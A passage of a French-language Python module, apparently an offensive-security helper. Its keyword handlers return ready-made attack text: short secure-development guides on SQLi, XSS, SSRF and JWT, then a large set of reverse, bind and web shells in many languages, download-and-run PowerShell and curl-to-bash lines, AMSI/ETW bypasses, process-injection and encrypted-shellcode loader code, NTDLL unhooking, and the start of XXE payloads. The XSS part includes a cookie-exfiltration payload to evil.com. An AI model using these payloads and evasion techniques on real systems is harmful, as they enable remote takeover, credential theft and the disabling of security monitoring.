                "  ' UNION SELECT NULL,NULL,NULL --\n"
                "  ' AND SLEEP(5) --  (blind time)\n"
                "  '; DROP TABLE users --  (stacked)\n\n"
                "DÉTECTION :\n"
                "  sqlmap -u 'http://site/?id=1' --dbs\n"
                "  sqlmap -u 'http://site/' --data='user=a&pass=b' --level=5\n\n"
                "REMÉDIATION :\n"
                "  PHP  : PDO avec prepare/execute\n"
                "  Python: SQLAlchemy ORM ou parameterized queries\n"
                "  Java : PreparedStatement\n"
                "  Code : $stmt = $pdo->prepare('SELECT * FROM u WHERE id = ?');\n"
                "         $stmt->execute([$id]);\n\n"
                "VALIDATION :\n"
                "  Whitelist d'entrée, cast de types, WAF",
                {"domain": "dev_secure", "vuln": "sqli"})

        if any(kw in t for kw in ["xss", "cross-site scripting"]):
            return self._result(True,
                "🛡️  XSS — Cross-Site Scripting\n\n"
                "TYPES :\n"
                "  Reflected  : payload dans l'URL, 1 victime\n"
                "  Stored     : payload en BDD, toutes les victimes\n"
                "  DOM-based  : manipulation du DOM côté client\n\n"
                "PAYLOADS BASIQUES :\n"
                "  <script>alert(1)</script>\n"
                "  <img src=x onerror=alert(1)>\n"
                "  javascript:alert(document.cookie)\n"
                "  <svg onload=fetch('https://evil.com/?c='+document.cookie)>\n\n"
                "EXPLOITATION :\n"
                "  BeEF (Browser Exploitation Framework) → hook navigateur\n"
                "  Vol de cookie (HttpOnly absent)\n"
                "  Keylogging, capture formulaires\n"
                "  Redirection vers phishing\n\n"
                "REMÉDIATION :\n"
                "  Encoder les sorties : htmlspecialchars() / DOMPurify\n"
                "  CSP : Content-Security-Policy: default-src 'self'\n"
                "  Cookies : HttpOnly; Secure; SameSite=Strict\n"
                "  Validation et sanitisation de toutes les entrées",
                {"domain": "dev_secure", "vuln": "xss"})

        if any(kw in t for kw in ["ssrf", "server-side request"]):
            return self._result(True,
                "🛡️  SSRF — Server-Side Request Forgery\n\n"
                "CIBLES CLASSIQUES :\n"
                "  http://127.0.0.1/admin          → services internes\n"
                "  http://169.254.169.254/          → AWS metadata\n"
                "  http://localhost:6379/           → Redis non authentifié\n"
                "  file:///etc/passwd              → lecture fichiers\n"
                "  dict://localhost:11211/         → Memcached\n\n"
                "DÉTECTION :\n"
                "  Burp Suite Collaborator → callbacks DNS/HTTP\n"
                "  Interactsh (open source) → détection OOB\n"
                "  Paramètres : url=, path=, dest=, redirect=, uri=\n\n"
                "BYPASS FILTRES :\n"
                "  http://0x7f000001/              → 127.0.0.1 en hex\n"
                "  http://[::1]/                  → IPv6 loopback\n"
                "  http://127.1/                  → octets manquants\n"
                "  Redirection 302 → contournement de whitelist\n\n"
                "REMÉDIATION :\n"
                "  Allowlist stricte d'URLs/IPs\n"
                "  Désactiver les redirections HTTP\n"
                "  Isoler le service dans un réseau dédié\n"
                "  IMDSv2 sur AWS (token requis)",
                {"domain": "dev_secure", "vuln": "ssrf"})

        if any(kw in t for kw in ["jwt", "json web token"]):
            return self._result(True,
                "🛡️  JWT — Attaques et sécurisation\n\n"
                "STRUCTURE :\n"
                "  Header.Payload.Signature (base64url encodés)\n\n"
                "ATTAQUES CLASSIQUES :\n"
                "  1. alg:none — supprimer la signature\n"
                "     {'alg': 'none'} → pas de vérification\n\n"
                "  2. RS256 → HS256 — confusion algorithme\n"
                "     Signer avec la clé publique RSA comme HMAC\n\n"
                "  3. Brute-force secret HS256\n"
                "     hashcat -a 0 -m 16500 <jwt> wordlist.txt\n"
                "     jwt_tool <token> -C -d wordlist.txt\n\n"
                "  4. kid injection\n"
                "     kid: '../../dev/null'  → clé vide\n\n"
                "  5. Claim pollution\n"
                "     Modifier sub/role/exp dans le payload\n\n"
                "OUTIL : jwt_tool (ticarpi/jwt_tool)\n"
                "  jwt_tool <token> -T          → tamper\n"
                "  jwt_tool <token> -X a        → alg:none\n"
                "  jwt_tool <token> -X s        → self-signed\n\n"
                "REMÉDIATION :\n"
                "  Forcer l'algorithme côté serveur (pas client)\n"
                "  Durée courte (< 15min) + refresh tokens\n"
                "  Valider toutes les claims\n"
                "  Ne pas stocker de données sensibles dans le payload",
                {"domain": "dev_secure", "vuln": "jwt"})

        if any(kw in t for kw in ["sast", "dast", "sonarqube", "semgrep", "snyk", "revue de code", "code review"]):
            return self._result(True,
                "🛡️  Analyse de code sécurisé (SAST/DAST)\n\n"
                "SAST — Analyse statique (boîte blanche) :\n"
                "  semgrep --config auto .         → multi-langages\n"
                "  bandit -r . -l                  → Python\n"
                "  sonarqube                       → CI/CD intégré\n"
                "  eslint-plugin-security          → JavaScript\n"
                "  brakeman                        → Ruby on Rails\n"
                "  gosec ./...                     → Go\n"
                "  snyk code test                  → multi-langages\n\n"
                "DAST — Analyse dynamique (boîte noire) :\n"
                "  OWASP ZAP     → scan automatique web\n"
                "  Nikto         → vulnérabilités web\n"
                "  Nuclei        → templates CVE\n\n"
                "SCA — Composants vulnérables :\n"
                "  snyk test                       → dépendances\n"
                "  owasp-dependency-check          → CVE dépendances\n"
                "  trivy fs .                      → scan filesystem\n"
                "  pip-audit / npm audit           → Python/JS\n\n"
                "SECRET SCANNING :\n"
                "  trufflehog git <repo>           → historique git\n"
                "  gitleaks detect                 → secrets dans code\n"
                "  git-secrets                     → pre-commit hook",
                {"domain": "dev_secure", "skill": "sast_dast"})

        if any(kw in t for kw in ["api security", "sécurité api", "cors", "csp", "headers"]):
            return self._result(True,
                "🛡️  Sécurité API & En-têtes HTTP\n\n"
                "EN-TÊTES SÉCURITÉ ESSENTIELS :\n"
                "  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\n"
                "  Content-Security-Policy: default-src 'self'\n"
                "  X-Content-Type-Options: nosniff\n"
                "  X-Frame-Options: DENY\n"
                "  Referrer-Policy: strict-origin-when-cross-origin\n"
                "  Permissions-Policy: camera=(), microphone=()\n\n"
                "CORS SÉCURISÉ :\n"
                "  Access-Control-Allow-Origin: https://app.trusted.com  (pas *)\n"
                "  Access-Control-Allow-Credentials: true  → jamais avec *\n"
                "  Vérifier côté serveur l'origine\n\n"
                "OWASP API TOP 10 :\n"
                "  API1  : BOLA (Broken Object Level Auth) — IDOR\n"
                "  API2  : Auth cassée\n"
                "  API3  : Object Property exposure (mass assignment)\n"
                "  API4  : Resource consumption (pas de rate limit)\n"
                "  API5  : BFLA (Function Level Auth)\n"
                "  API8  : Security misconfiguration\n"
                "  API10 : Unsafe API consumption\n\n"
                "TESTER :\n"
                "  securityheaders.com → analyser les headers\n"
                "  Postman / Insomnia  → tester API\n"
                "  OWASP ZAP API scan",
                {"domain": "dev_secure", "skill": "api_security"})

        if any(kw in t for kw in ["supply chain", "dependency confusion", "trufflehog", "gitleaks", "secret"]):
            return self._result(True,
                "🛡️  Supply Chain & Secrets Scanning\n\n"
                "ATTAQUES SUPPLY CHAIN :\n"
                "  Dependency Confusion\n"
                "    Publier un paquet malveillant sur PyPI/npm avec le même nom\n"
                "    que des paquets internes privés (score de version plus élevé)\n\n"
                "  Typosquatting : requests vs requets, numpy vs numply\n\n"
                "  SolarWinds-style : compromission du pipeline CI/CD\n\n"
                "PROTECTION :\n"
                "  pip install --index-url https://repo.interne.fr/ paquet\n"
                "  npm config set registry https://registry.interne.fr/\n"
                "  Pinning de versions exactes + hash (pip hash, npm lockfile)\n"
                "  SBOM (Software Bill of Materials) : syft . -o spdx\n\n"
                "SECRET SCANNING :\n"
                "  trufflehog git https://github.com/org/repo  → historique git\n"
                "  gitleaks detect --source .                  → local\n"
                "  gitleaks protect --staged                   → pre-commit\n"
                "  github.com secret scanning (natif GitHub)\n\n"
                "PRE-COMMIT HOOKS :\n"
                "  pre-commit install\n"
                "  .pre-commit-config.yaml : detect-secrets, gitleaks, bandit",
                {"domain": "dev_secure", "skill": "supply_chain"})

        return self._result(True,
            "🛡️  Développement Sécurisé — Domaines couverts\n\n"
            "  owasp top 10      → les 10 vulnérabilités web principales\n"
            "  injection sql     → SQLi — détection et remédiation\n"
            "  xss               → Cross-Site Scripting\n"
            "  ssrf              → Server-Side Request Forgery\n"
            "  jwt               → attaques JWT et sécurisation\n"
            "  sast / code review→ analyse statique et outils\n"
            "  api security      → headers HTTP, CORS, OWASP API\n"
            "  supply chain      → dependency confusion, secrets\n\n"
            "Précise la vulnérabilité ou le contexte pour un guide détaillé.",
            {"domain": "dev_secure"})


    # ══════════════════════════════════════════════════════════════════════════
    # DOMAINE 10 — REVERSE SHELLS (multi-langages)
    # ══════════════════════════════════════════════════════════════════════════

    def _handle_reverse_shell(self, task: str) -> dict:
        t = task.lower()
        lhost = self._extract_ip(task) or "10.10.10.10"
        lport = self._extract_port(task) or "4444"

        listener_nc = f"nc -lvnp {lport}"
        listener_msf = (
            f"msfconsole -q -x 'use exploit/multi/handler; "
            f"set payload linux/x64/shell_reverse_tcp; "
            f"set LHOST {lhost}; set LPORT {lport}; run'"
        )
        upgrade_tty = (
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
            "# Ctrl+Z → stty raw -echo; fg → export TERM=xterm"
        )

        if any(kw in t for kw in ["python", "py", "python3"]):
            output = (
                f"🐚 REVERSE SHELL — Python3  [{lhost}:{lport}]\n\n"
                f"─ socket + pty (stable) ─\n"
                f"python3 -c 'import os,pty,socket;"
                f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
                f"[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'\n\n"
                f"─ subprocess ─\n"
                f"python3 -c 'import socket,subprocess,os;"
                f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"subprocess.call([\"/bin/bash\",\"-i\"])'\n\n"
                f"─ fichier revshell.py ─\n"
                f"import socket,os,pty\n"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
                f"s.connect((\"{lhost}\",{lport}))\n"
                f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)\n"
                f"pty.spawn(\"/bin/bash\")\n\n"
                f"LISTENER : {listener_nc}\n"
                f"UPGRADE  : {upgrade_tty}"
            )
            return self._result(True, output, {"type": "revshell", "lang": "python", "lhost": lhost, "lport": lport})

        if "bash" in t:
            output = (
                f"🐚 REVERSE SHELL — Bash  [{lhost}:{lport}]\n\n"
                f"─ /dev/tcp ─\n"
                f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n\n"
                f"─ exec ─\n"
                f"exec bash -i &>/dev/tcp/{lhost}/{lport} <&1\n\n"
                f"─ encodé base64 (bypass WAF) ─\n"
                f"echo YmFzaCAtaSA+JiAvZGV2L3RjcC97bGhvc3R9L3tsb3J0fSAwPiYx | base64 -d | bash\n"
                f"  (remplace {{lhost}}={lhost} et {{lport}}={lport} dans la string puis encode)\n\n"
                f"─ curl + bash (si accès web) ─\n"
                f"curl http://{lhost}/rev.sh | bash\n\n"
                f"LISTENER : {listener_nc}\n"
                f"UPGRADE  : {upgrade_tty}"
            )
            return self._result(True, output, {"type": "revshell", "lang": "bash", "lhost": lhost, "lport": lport})

        if "php" in t:
            output = (
                f"🐚 REVERSE SHELL — PHP  [{lhost}:{lport}]\n\n"
                f"─ proc_open (stable) ─\n"
                f"<?php $s=fsockopen(\"{lhost}\",{lport});"
                f"$p=proc_open(\"/bin/sh -i\",array(0=>$s,1=>$s,2=>$s),$pipes);?>\n\n"
                f"─ exec ─\n"
                f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\");?>\n\n"
                f"─ webshell → revshell ─\n"
                f"<?php system($_GET['cmd']);?>\n"
                f"# Puis : curl 'http://victim/sh.php?cmd=bash+-c+\"bash+-i+>%26+/dev/tcp/{lhost}/{lport}+0>%261\"'\n\n"
                f"─ one-liner cli ─\n"
                f"php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n"
                f"LISTENER : {listener_nc}\n"
                f"UPGRADE  : {upgrade_tty}"
            )
            return self._result(True, output, {"type": "revshell", "lang": "php", "lhost": lhost, "lport": lport})

        if any(kw in t for kw in ["powershell", "ps", "windows", "win"]):
            import base64 as _b64
            ps_code = (
                f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
                f"$stream = $client.GetStream();"
                f"[byte[]]$bytes = 0..65535|%{{0}};"
                f"while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{"
                f"$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
                f"$sb=(iex $data 2>&1|Out-String);"
                f"$sb2=$sb+'PS '+(pwd).Path+'> ';"
                f"$sb3=([text.encoding]::ASCII).GetBytes($sb2);"
                f"$stream.Write($sb3,0,$sb3.Length);$stream.Flush()}};$client.Close()"
            )
            enc = _b64.b64encode(ps_code.encode("utf-16-le")).decode()
            output = (
                f"🐚 REVERSE SHELL — PowerShell  [{lhost}:{lport}]\n\n"
                f"─ classique ─\n"
                f"powershell -nop -c \"{ps_code}\"\n\n"
                f"─ encodé base64 (bypass ScriptBlock logging) ─\n"
                f"powershell -nop -enc {enc}\n\n"
                f"─ IEX download (si accès web) ─\n"
                f"powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient)"
                f".DownloadString('http://{lhost}/rev.ps1')\"\n\n"
                f"─ cmd.exe → PS ─\n"
                f"cmd /c powershell -nop -w hidden -enc {enc}\n\n"
                f"LISTENER MSF :\n"
                f"msfconsole -q -x 'use exploit/multi/handler; "
                f"set payload windows/x64/meterpreter/reverse_tcp; "
                f"set LHOST {lhost}; set LPORT {lport}; run'"
            )
            return self._result(True, output, {"type": "revshell", "lang": "powershell", "lhost": lhost, "lport": lport})

        if "ruby" in t:
            output = (
                f"🐚 REVERSE SHELL — Ruby  [{lhost}:{lport}]\n\n"
                f"ruby -rsocket -e 'exit if fork;"
                f"c=TCPSocket.new(\"{lhost}\",{lport});"
                f"while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'\n\n"
                f"LISTENER : {listener_nc}\n"
                f"UPGRADE  : {upgrade_tty}"
            )
            return self._result(True, output, {"type": "revshell", "lang": "ruby", "lhost": lhost, "lport": lport})

        if "perl" in t:
            output = (
                f"🐚 REVERSE SHELL — Perl  [{lhost}:{lport}]\n\n"
                f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
                f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'\n\n"
                f"LISTENER : {listener_nc}\n"
                f"UPGRADE  : {upgrade_tty}"
            )
            return self._result(True, output, {"type": "revshell", "lang": "perl", "lhost": lhost, "lport": lport})

        if any(kw in t for kw in ["golang", "go"]):
            output = (
                f"🐚 REVERSE SHELL — Golang  [{lhost}:{lport}]\n\n"
                f'package main\nimport ("net";"os";"os/exec")\n'
                f'func main() {{\n'
                f'  c, _ := net.Dial("tcp", "{lhost}:{lport}")\n'
                f'  cmd := exec.Command("/bin/bash")\n'
                f'  cmd.Stdin = c; cmd.Stdout = c; cmd.Stderr = c\n'
                f'  cmd.Run()\n}}\n\n'
                f"go build -o rev rev.go && ./rev\n\n"
                f"LISTENER : {listener_nc}\n"
                f"UPGRADE  : {upgrade_tty}"
            )
            return self._result(True, output, {"type": "revshell", "lang": "golang", "lhost": lhost, "lport": lport})

        if any(kw in t for kw in ["nc", "netcat"]):
            output = (
                f"🐚 REVERSE SHELL — Netcat  [{lhost}:{lport}]\n\n"
                f"─ nc avec -e (GNU netcat) ─\n"
                f"nc -e /bin/bash {lhost} {lport}\n\n"
                f"─ nc sans -e (mkfifo) ─\n"
                f"rm /tmp/f 2>/dev/null; mkfifo /tmp/f; "
                f"cat /tmp/f | /bin/bash -i 2>&1 | nc {lhost} {lport} > /tmp/f\n\n"
                f"─ ncat ─\n"
                f"ncat {lhost} {lport} -e /bin/bash\n\n"
                f"─ busybox nc ─\n"
                f"busybox nc {lhost} {lport} -e /bin/sh\n\n"
                f"LISTENER : {listener_nc}"
            )
            return self._result(True, output, {"type": "revshell", "lang": "netcat", "lhost": lhost, "lport": lport})

        if any(kw in t for kw in ["webshell", "web shell"]):
            output = (
                f"🐚 WEBSHELLS  [pivot vers {lhost}:{lport}]\n\n"
                f"─ PHP minimaliste ─\n"
                f"<?php system($_GET['cmd']);?>\n\n"
                f"─ PHP POST (moins visible dans les logs) ─\n"
                f"<?php if(isset($_POST['c'])){{system($_POST['c']);}}?>\n\n"
                f"─ PHP obfusqué ─\n"
                f"<?php @eval(base64_decode($_POST['x']));?>\n\n"
                f"─ ASPX ─\n"
                f"<%@ Page Language=\"C#\" %>\n"
                f"<%@ Import Namespace=\"System.Diagnostics\" %>\n"
                f"<% var proc = new Process{{StartInfo={{FileName=\"cmd.exe\","
                f"Arguments=\"/c \"+Request[\"cmd\"],UseShellExecute=false,"
                f"RedirectStandardOutput=true}}}}; proc.Start();\n"
                f"Response.Write(proc.StandardOutput.ReadToEnd()); %>\n\n"
                f"─ JSP ─\n"
                f"<%Runtime rt=Runtime.getRuntime();\n"
                f"String[] c={{\"bash\",\"-c\",request.getParameter(\"cmd\")}};\n"
                f"Process p=rt.exec(c);\n"
                f"out.println(new String(p.getInputStream().readAllBytes()));%>\n\n"
                f"─ Upgrade webshell → reverse shell ─\n"
                f"curl 'http://victim/sh.php?cmd=bash+-c+"
                f"\"bash+-i+>%26+/dev/tcp/{lhost}/{lport}+0>%261\"'"
            )
            return self._result(True, output, {"type": "webshell", "lhost": lhost, "lport": lport})

        if any(kw in t for kw in ["bind shell", "bind"]):
            output = (
                f"🔗 BIND SHELL  [port {lport} sur la cible]\n\n"
                f"─ nc ─\n"
                f"nc -lvnp {lport} -e /bin/bash\n\n"
                f"─ nc mkfifo ─\n"
                f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp {lport} > /tmp/f\n\n"
                f"─ python3 ─\n"
                f"python3 -c 'import socket,os,pty;"
                f"s=socket.socket();s.bind((\"\",{lport}));s.listen(1);"
                f"c,a=s.accept();[os.dup2(c.fileno(),f) for f in(0,1,2)];"
                f"pty.spawn(\"/bin/bash\")'\n\n"
                f"─ msfvenom bind payload ─\n"
                f"msfvenom -p linux/x64/shell_bind_tcp LPORT={lport} -f elf -o bind_shell\n\n"
                f"CONNEXION DEPUIS L'ATTAQUANT : nc {'{TARGET_IP}'} {lport}"
            )
            return self._result(True, output, {"type": "bindshell", "lport": lport})

        # Défaut : menu complet
        output = (
            f"🐚 REVERSE SHELLS — Menu complet  [{lhost}:{lport}]\n\n"
            f"BASH :\n"
            f"  bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n\n"
            f"PYTHON3 :\n"
            f"  python3 -c 'import os,pty,socket;s=socket.socket();"
            f"s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];"
            f"pty.spawn(\"/bin/bash\")'\n\n"
            f"PHP :\n"
            f"  php -r '$s=fsockopen(\"{lhost}\",{lport});"
            f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n"
            f"NETCAT :\n"
            f"  nc -e /bin/bash {lhost} {lport}\n"
            f"  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f\n\n"
            f"RUBY :\n"
            f"  ruby -rsocket -e 'c=TCPSocket.new(\"{lhost}\",{lport});"
            f"while(cmd=c.gets);IO.popen(cmd){{|io|c.print io.read}};end'\n\n"
            f"PERL :\n"
            f"  perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");"
            f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'\n\n"
            f"LISTENER : nc -lvnp {lport}\n\n"
            f"UPGRADE TTY :\n"
            f"  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"
            f"  Ctrl+Z → stty raw -echo; fg → export TERM=xterm\n\n"
            f"Précise : bash / python / php / powershell / ruby / perl / golang / nc / webshell / bind"
        )
        return self._result(True, output, {"type": "revshell_menu", "lhost": lhost, "lport": lport})

    # ══════════════════════════════════════════════════════════════════════════
    # DOMAINE 11 — AV / AMSI / EDR BYPASS
    # ══════════════════════════════════════════════════════════════════════════

    def _handle_av_bypass(self, task: str) -> dict:
        t = task.lower()

        if any(kw in t for kw in ["amsi", "amsi bypass"]):
            return self._result(True,
                "🛡️  AMSI BYPASS — PowerShell\n\n"
                "MÉTHODE 1 — Patch mémoire AmsiScanBuffer (le plus fiable) :\n"
                "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
                ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n"
                "MÉTHODE 2 — Patch via P/Invoke :\n"
                "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
                "$b=$a.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static');"
                "$c=$b.GetValue($null);"
                "[Runtime.InteropServices.Marshal]::WriteInt32($c,0x41424344)\n\n"
                "MÉTHODE 3 — Patch binaire amsi.dll :\n"
                "# Trouver AmsiScanBuffer dans amsi.dll\n"
                "# Remplacer les premiers bytes par : 0xB8 0x57 0x00 0x07 0x80 0xC3\n"
                "# (retourne E_INVALIDARG — scan non effectué)\n\n"
                "MÉTHODE 4 — Reflection + obfuscation (bypass signature-based AV) :\n"
                "$a='System.Management.Automation.A'+'msiUtils';\n"
                "$b=[Ref].Assembly.GetType($a);\n"
                "$c=$b.GetField('amsiInitFailed','NonPublic,Static');\n"
                "$c.SetValue($null,$true)\n\n"
                "MÉTHODE 5 — ETW disable (pour logging) :\n"
                "[Reflection.Assembly]::LoadWithPartialName('System.Core');"
                "$a=[Reflection.Assembly]::LoadWithPartialName('System.Management.Automation');"
                "$b=$a.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');"
                "$c=$b.GetField('etwProvider','NonPublic,Static');\n"
                "[Runtime.InteropServices.Marshal]::WriteInt32([IntPtr]($c.GetValue($null)),0)\n\n"
                "NOTE : Tester avec :\n"
                "  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)",
                {"domain": "av_bypass", "technique": "amsi"})

        if any(kw in t for kw in ["process hollowing", "process injection", "reflective dll"]):
            return self._result(True,
                "🛡️  PROCESS INJECTION / HOLLOWING\n\n"
                "PROCESS HOLLOWING (CreateProcess + suspend + unmap + inject) :\n"
                "  1. CreateProcess(target, SUSPENDED)         → PID\n"
                "  2. ReadProcessMemory → récupérer entrypoint\n"
                "  3. NtUnmapViewOfSection → désallouer image légitime\n"
                "  4. VirtualAllocEx(pid, shellcode_size, RWX)\n"
                "  5. WriteProcessMemory → injecter payload\n"
                "  6. SetThreadContext(Rcx = new_entrypoint)\n"
                "  7. ResumeThread\n\n"
                "CLASSIC INJECTION (CreateRemoteThread) :\n"
                "  HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n"
                "  LPVOID buf = VirtualAllocEx(h, NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
                "  WriteProcessMemory(h, buf, shellcode, shellcode_len, NULL);\n"
                "  CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);\n\n"
                "REFLECTIVE DLL INJECTION (Stephen Fewer) :\n"
                "  - DLL avec ReflectiveDLLInjection export\n"
                "  - Charge la DLL en mémoire sans LoadLibrary\n"
                "  - Contourne les hooks user-mode sur CreateRemoteThread\n"
                "  - Implémentation : github.com/stephenfewer/ReflectiveDLLInjection\n\n"
                "APC INJECTION :\n"
                "  OpenProcess → VirtualAllocEx → WriteProcessMemory\n"
                "  OpenThread(THREAD_SET_CONTEXT) → QueueUserAPC(shellcode_addr)\n"
                "  ResumeThread → APC s'exécute quand le thread est alertable\n\n"
                "DIRECT SYSCALLS (Hell's Gate / Syswhispers) :\n"
                "  - Bypass hooks NTDLL user-mode (EDR/AV)\n"
                "  - Appel direct SSN (System Service Number) via assembleur inline\n"
                "  - Syswhispers3 : génère stubs asm pour NtAllocateVirtualMemory, etc.\n"
                "  - Hell's Gate : lit dynamiquement les SSN depuis ntdll.dll en mémoire",
                {"domain": "av_bypass", "technique": "injection"})

        if any(kw in t for kw in ["xor payload", "rc4 payload", "encrypt shellcode", "obfusqu"]):
            return self._result(True,
                "🛡️  OBFUSCATION & CHIFFREMENT DE SHELLCODE\n\n"
                "XOR ENCODER (Python) :\n"
                "key = 0x41\n"
                "shellcode = b'\\x48\\x31\\xc0...'\n"
                "encoded = bytes([b ^ key for b in shellcode])\n"
                "# Décodeur C intégré dans le loader :\n"
                "for(int i=0;i<len;i++) buf[i] ^= 0x41;\n\n"
                "RC4 ENCODER (Python) :\n"
                "from Crypto.Cipher import ARC4\n"
                "key = b'MySecretKey'\n"
                "cipher = ARC4.new(key)\n"
                "encoded = cipher.encrypt(shellcode)\n\n"
                "AES-256-CBC (Python) :\n"
                "from Crypto.Cipher import AES\n"
                "from Crypto.Random import get_random_bytes\n"
                "key = get_random_bytes(32); iv = get_random_bytes(16)\n"
                "cipher = AES.new(key, AES.MODE_CBC, iv)\n"
                "encoded = cipher.encrypt(shellcode + b'\\x00' * (16 - len(shellcode) % 16))\n\n"
                "LOADER C (decrypte + exec en mémoire) :\n"
                "unsigned char buf[] = {...}; // shellcode chiffré\n"
                "HANDLE heap = HeapAlloc(GetProcessHeap(), 0, sizeof(buf));\n"
                "memcpy(heap, buf, sizeof(buf));\n"
                "// XOR decode\n"
                "for(int i=0; i<sizeof(buf); i++) ((char*)heap)[i] ^= 0x41;\n"
                "HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)heap, NULL, 0, NULL);\n"
                "WaitForSingleObject(t, INFINITE);\n\n"
                "OUTILS :\n"
                "  msfvenom --encoder x86/shikata_ga_nai -i 3\n"
                "  Donut — shellcode depuis PE/NET : github.com/TheWover/donut\n"
                "  Freeze — signed loader avec stomping : github.com/optiv/Freeze\n"
                "  Scarecrow — EDR bypass loader : github.com/optiv/ScareCrow",
                {"domain": "av_bypass", "technique": "obfuscation"})

        if any(kw in t for kw in ["syswhispers", "hell's gate", "unhooking", "direct syscall"]):
            return self._result(True,
                "🛡️  DIRECT SYSCALLS & UNHOOKING NTDLL\n\n"
                "POURQUOI :\n"
                "  Les EDR hookent les fonctions NTDLL en user-mode (NtAllocateVirtualMemory,\n"
                "  NtCreateThreadEx, NtWriteVirtualMemory) pour intercepter les appels.\n"
                "  Les direct syscalls contournent ces hooks en appelant directement le kernel.\n\n"
                "SYSWHISPERS3 (génération de stubs) :\n"
                "  python3 syswhispers.py --preset all -o syscalls\n"
                "  # Génère syscalls.h + syscalls.asm\n"
                "  # Inclure dans le projet C/C++ + assembler avec MASM\n\n"
                "HELL'S GATE (lecture dynamique SSN depuis ntdll.dll) :\n"
                "  1. Charger ntdll.dll en mémoire (GetModuleHandle)\n"
                "  2. Parser l'EAT (Export Address Table)\n"
                "  3. Pour chaque fonction Nt*, lire les bytes au début :\n"
                "     si mov eax, SSN → extraire SSN\n"
                "     si hooked (jmp) → lire SSN depuis le stub ou l'EAT de la copy non-hookée\n"
                "  4. Appeler via inline asm : mov eax, SSN; syscall\n\n"
                "UNHOOKING NTDLL (restaurer les bytes originaux) :\n"
                "  1. Ouvrir ntdll.dll frais depuis le disque (CreateFile + MapViewOfFile)\n"
                "  2. Localiser la section .text dans la version propre\n"
                "  3. VirtualProtect(ntdll_base + .text_offset, RWX)\n"
                "  4. Copier la section .text propre sur l'actuelle\n"
                "  5. Restaurer les permissions d'origine (RX)\n\n"
                "IMPLÉMENTATIONS :\n"
                "  Syswhispers3 : github.com/klezVirus/SysWhispers3\n"
                "  Hell's Gate : github.com/am0nsec/HellsGate\n"
                "  Tartarus Gate (VEH hooks) : github.com/trickster0/TartarusGate",
                {"domain": "av_bypass", "technique": "syscalls"})

        return self._result(True,
            "🛡️  AV / AMSI / EDR BYPASS — Techniques disponibles\n\n"
            "  amsi bypass          → patcher AMSI en mémoire (PowerShell)\n"
            "  process hollowing    → injection via CreateProcess suspended\n"
            "  process injection    → CreateRemoteThread / APC injection\n"
            "  reflective dll       → DLL injection sans LoadLibrary\n"
            "  xor payload          → encoder shellcode en XOR/RC4/AES\n"
            "  obfusquer payload    → encodage + chiffrement loader\n"
            "  syswhispers          → direct syscalls (Syswhispers3)\n"
            "  hell's gate          → SSN dynamique depuis ntdll\n"
            "  unhooking ntdll      → restaurer bytes originaux NTDLL\n"
            "  bypass defender      → techniques AV evasion Windows\n\n"
            "Précise la technique pour le code complet.",
            {"domain": "av_bypass"})

    # ══════════════════════════════════════════════════════════════════════════
    # DOMAINE 12 — XXE (XML External Entity)
    # ══════════════════════════════════════════════════════════════════════════

    def _handle_xxe(self, task: str) -> dict:
        attacker_ip = self._extract_ip(task) or "10.10.10.10"
        return self._result(True,
            "💣 XXE — XML External Entity Injection\n\n"
            "PAYLOADS DE BASE :\n\n"
            "─ Lecture fichier local ─\n"
            "<?xml version=\"1.0\"?>\n"
            "<!DOCTYPE root [\n"
            "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
            "]>\n"
            "<root>&xxe;</root>\n\n"
            "─ Lecture Windows ─\n"
            "<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n\n"
            "─ SSRF vers service interne ─\n"
